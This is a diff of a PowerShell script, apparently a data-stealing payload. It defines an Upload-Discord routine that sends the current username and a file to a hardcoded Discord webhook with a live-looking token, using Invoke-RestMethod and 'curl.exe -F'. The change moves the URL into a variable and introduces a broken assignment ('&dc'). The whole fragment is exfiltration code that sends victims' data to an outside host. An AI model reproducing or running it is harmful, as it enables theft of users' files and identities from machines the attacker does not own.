@@ -90,8 +90,8 @@ param (
     [parameter(Position=1,Mandatory=$False)]
     [string]$text 
 )
-
-$hookurl = "https://discordapp.com/api/webhooks/1073923961051693066/pS9QjXhkKgA-BEUQoq2fPgAccEh8AkNmeh2jQZEscmEqqDCilqZqqqG-iaDtfzpWXCMf"
+$dc = "https://discordapp.com/api/webhooks/1073923961051693066/pS9QjXhkKgA-BEUQoq2fPgAccEh8AkNmeh2jQZEscmEqqDCilqZqqqG-iaDtfzpWXCMf"
+$hookurl = "&dc"
 
 $Body = @{
   'username' = $env:username
@@ -104,7 +104,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty(https://discordapp.com/api/webhooks/1073923961051693066/pS9QjXhkKgA-BEUQoq2fPgAccEh8AkNmeh2jQZEscmEqqDCilqZqqqG-iaDtfzpWXCMf))){Upload-Discord -file "$FileName"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
 
 
 #------------------------------------------------------------------------------------------------------------------------------------
